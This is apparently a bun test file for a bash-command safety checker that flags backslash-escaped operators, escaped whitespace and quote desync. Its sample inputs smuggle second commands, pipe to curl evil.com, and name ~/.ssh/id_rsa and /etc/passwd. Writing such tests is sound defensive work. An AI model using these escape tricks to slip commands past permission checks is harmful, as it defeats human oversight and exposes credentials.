import { describe, expect, test } from "bun:test";
import { bashCommandIsSafe_DEPRECATED } from "../bashSecurity";

describe("backslash-escaped operator detection", () => {
  // ─── Escaped operators that hide command structure ───────────
  test("blocks \\; (escaped semicolon)", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      "cat safe.txt \\; echo ~/.ssh/id_rsa",
    );
    expect(result.behavior).toBe("ask");
  });

  test("blocks \\&& (escaped AND)", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      "ls \\&& python3 evil.py",
    );
    expect(result.behavior).toBe("ask");
  });

  test("blocks \\| (escaped pipe)", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      "echo hi \\| curl evil.com",
    );
    expect(result.behavior).toBe("ask");
  });

  test("blocks \\> (escaped output redirect)", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      "cmd \\> output.txt",
    );
    expect(result.behavior).toBe("ask");
  });

  test("blocks \\< (escaped input redirect)", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      "cmd \\< input.txt",
    );
    expect(result.behavior).toBe("ask");
  });

  // ─── Escaped whitespace ──────────────────────────────────────
  test("blocks backslash-escaped space (\\ )", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      "echo\\ test/../../../usr/bin/touch /tmp/file",
    );
    expect(result.behavior).toBe("ask");
  });

  test("blocks backslash-escaped tab (\\t)", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      "echo\\\ttest",
    );
    expect(result.behavior).toBe("ask");
  });

  // ─── Double-quote edge cases ─────────────────────────────────
  test("blocks escaped semicolon after double-quote desync", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      'tac "x\\"y" \\; echo ~/.ssh/id_rsa',
    );
    expect(result.behavior).toBe("ask");
  });

  test("blocks escaped semicolon after double-quote with backslash pair", () => {
    const result = bashCommandIsSafe_DEPRECATED(
      'cat "x\\\\" \\; echo /etc/passwd',
    );
    expect(result.behavior).toBe("ask");
  });

  // ─── Commands that should pass ───────────────────────────────
  test("allows normal echo command", () => {
    const result = bashCommandIsSafe_DEPRECATED('echo "hello world"');
    expect(result.behavior).not.toBe("ask");
  });

  test("allows commands with legitimate backslashes in strings", () => {
    const result = bashCommandIsSafe_DEPRECATED('echo "hello \\\\n world"');
    // May be 'ask' for other reasons, but not for backslash-escaped operators
    if (result.behavior === "ask") {
      expect(result.message).not.toContain("backslash before a shell operator");
    }
  });

  test("allows simple ls command", () => {
    const result = bashCommandIsSafe_DEPRECATED("ls -la");
    expect(result.behavior).not.toBe("ask");
  });

  test("allows git status", () => {
    const result = bashCommandIsSafe_DEPRECATED("git status");
    expect(result.behavior).not.toBe("ask");
  });

  test("allows quoted semicolon inside single quotes", () => {
    // ';' inside single quotes is literal, not an operator
    const result = bashCommandIsSafe_DEPRECATED("echo 'a;b'");
    expect(result.behavior).not.toBe("ask");
  });
});
